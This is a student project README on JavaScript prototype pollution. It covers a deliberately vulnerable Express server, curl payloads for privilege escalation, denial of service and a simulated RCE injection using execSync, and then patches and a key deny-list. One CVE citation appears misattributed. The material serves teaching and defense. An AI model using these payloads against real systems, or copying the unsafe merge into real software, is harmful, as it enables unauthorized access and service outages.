# Prototype Pollution Attack — Research & POC

> **Final Project | Web Systems Security | Track A — Attack Research & POC**  
> Azrieli College of Engineering  
> Marwa Hoshia & Fatima Abu Abed

---

## What is Prototype Pollution?

Prototype Pollution is a critical JavaScript vulnerability that allows an attacker to inject properties into `Object.prototype`. Because **all JavaScript objects inherit from `Object.prototype`**, any injected property becomes visible on every object in the application — including ones the developer never intended to be modified.

```
Attacker sends:  { "__proto__": { "isAdmin": true } }
                          ↓
               Object.prototype.isAdmin = true
                          ↓
          const user = {}
          user.isAdmin → true  ← inherits from polluted prototype!
```

---

## Project Structure

```
prototype-pollution-poc/
│
├── src/
│   └── server-vulnerable.js     ← Intentionally vulnerable Express server (port 3000)
│
├── exploits/
│   └── exploit-all.js           ← Full attack script (3 attack types)
│
├── fixes/
│   ├── server-fixed.js          ← Patched secure server (port 3001)
│   └── verify-fixes.js          ← Verification that all attacks are blocked
│
├── demos/
│   └── concept-demo.js          ← Standalone concept demo (no server needed)
│
├── package.json
└── README.md
```

---

## Setup

```bash
# Clone the repo
git clone https://github.com/Azrieli-College-of-Engineering/final-project-marwa-and-fatima
cd final-project-marwa-and-fatima

# Install dependencies (only Express)
npm install
```

---

## How to Run the Demo

### Step 0 — Standalone concept demo (no server needed)
```bash
node demos/concept-demo.js
```
This script explains the prototype chain, shows all 3 attacks, and demonstrates the defenses — all in pure JavaScript with no HTTP server required. **Start here.**

---

### Step 1 — Run the vulnerable server
```bash
npm run start:vulnerable
# or: node src/server-vulnerable.js
```
Server starts on **http://localhost:3000**

---

### Step 2 — Run the full exploit
```bash
npm run exploit
# or: node exploits/exploit-all.js
```

This runs **3 attacks automatically**:

| Attack | Endpoint | Technique | Impact |
|--------|----------|-----------|--------|
| Privilege Escalation | `POST /api/update-profile` → `GET /api/admin` | `__proto__.isAdmin = true` | Admin access without credentials |
| Denial of Service | `POST /api/settings` | `__proto__.timeout = "CORRUPTED"` | NaN crashes all subsequent requests |
| RCE Simulation | `POST /api/update-profile` → `POST /api/render` | `__proto__.dangerousOption` | Payload reaches template engine eval() |

---

### Step 3 — Run the secure server
```bash
npm run start:fixed
# or: node fixes/server-fixed.js
```
Server starts on **http://localhost:3001**

---

### Step 4 — Verify all attacks are blocked
```bash
npm run verify
# or: node fixes/verify-fixes.js
```
Runs 8 tests confirming every attack is rejected by the patched server.

---

## Attack Deep Dive

### Attack 1 — Privilege Escalation

The vulnerable server uses an unsafe `for...in` merge that does not skip the `__proto__` key:

```javascript
// VULNERABLE
function unsafeMerge(target, source) {
  for (const key in source) {    // ← for...in traverses prototype chain
    target[key] = source[key];   // ← key="__proto__" sets Object.prototype!
  }
}

// Attacker payload:
// POST /api/update-profile
// { "username": "alice", "updates": { "__proto__": { "isAdmin": true } } }

// Result: Object.prototype.isAdmin = true
// Now: const user = {};  user.isAdmin → true  (ANY empty object is "admin"!)
```

**Manual exploit with curl:**
```bash
# Step 1: Inject the payload
curl -X POST http://localhost:3000/api/update-profile \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "updates": {"__proto__": {"isAdmin": true}}}'

# Step 2: Access admin (no login needed!)
curl http://localhost:3000/api/admin
# → { "access": "GRANTED", "secretData": "FLAG{pr0t0type_p0lluti0n_pwned_y0u}" }
```

---

### Attack 2 — Denial of Service

Polluting `Object.prototype.timeout` with a string value corrupts the server's numeric computation:

```bash
curl -X POST http://localhost:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"timeout": "CORRUPTED_STRING"}}'

# Result: All subsequent requests get 500 Internal Server Error
# Because: "CORRUPTED_STRING" * 1000 = NaN → isNaN check throws error
# Server must be restarted to recover
```

---

### Attack 3 — RCE Simulation

Certain template engines (e.g., pug/jade before patches) pass render options directly to `new Function()`:

```bash
# Step 1: Pollute with dangerous template option
curl -X POST http://localhost:3000/api/update-profile \
  -H "Content-Type: application/json" \
  -d '{"username": "bob", "updates": {"__proto__": {"dangerousOption": "require('"'"'child_process'"'"').execSync('"'"'id'"'"')"}}}'

# Step 2: Trigger the renderer — empty options {} inherits the payload
curl -X POST http://localhost:3000/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "dashboard", "options": {}}'

# → RCE payload reaches the render function!
# → In real pug, this executes arbitrary OS commands
```

> **Real CVEs:** CVE-2019-8331 (pug), CVE-2021-23337 (lodash template), CVE-2019-10744 (lodash merge)

---

## Defense Mechanisms

All defenses are implemented in `fixes/server-fixed.js`:

### 1. Key Sanitization (Deny-list)
```javascript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {  // Object.keys, not for...in
    if (DANGEROUS_KEYS.has(key)) continue;  // block dangerous keys
    // ... safe recursion
  }
}
```

### 2. Object.keys() instead of for...in
```javascript
// WRONG: for...in traverses the prototype chain
for (const key in source) { ... }

// CORRECT: Object.keys() returns only own enumerable properties
for (const key of Object.keys(source)) { ... }
```

### 3. Object.freeze(Object.prototype)
```javascript
// At application startup:
Object.freeze(Object.prototype);
// Now any attempt to modify Object.prototype throws TypeError
```

### 4. Object.create(null)
```javascript
// Creates objects with NO prototype — immune to pollution
const safeObj = Object.create(null);
safeObj.__proto__; // undefined — no prototype chain
```

### 5. Input Schema Validation
```javascript
// Validate all input keys before merging
const ALLOWED_KEYS = new Set(['displayName', 'email', 'bio']);
for (const key of Object.keys(input)) {
  if (!ALLOWED_KEYS.has(key)) return res.status(400).json({ error: 'Invalid key' });
}
```

---

## Real-World CVEs

| CVE | Package | CVSS | Description |
|-----|---------|------|-------------|
| CVE-2019-10744 | lodash < 4.17.12 | 9.1 Critical | `_.merge()` vulnerable to prototype pollution |
| CVE-2020-28499 | merge ≤ 2.1.0 | 9.8 Critical | `merge.recursive()` follows `__proto__` |
| CVE-2022-24999 | qs < 6.7.3 | 7.5 High | Query string parsing pollutes prototype |
| CVE-2021-23337 | lodash | 7.2 High | `_.template()` reaches `eval()` via polluted options |

---

## Sources

- [OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [MDN — Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype)
- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [NVD — CVE-2019-10744](https://nvd.nist.gov/vuln/detail/CVE-2019-10744)
- [Snyk — Prototype Pollution in npm](https://security.snyk.io/vuln?type=npm&search=prototype+pollution)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security)

---

> ⚠️ **Disclaimer:** This project is for educational purposes only. The vulnerable server is intentionally insecure and must never be deployed in production.
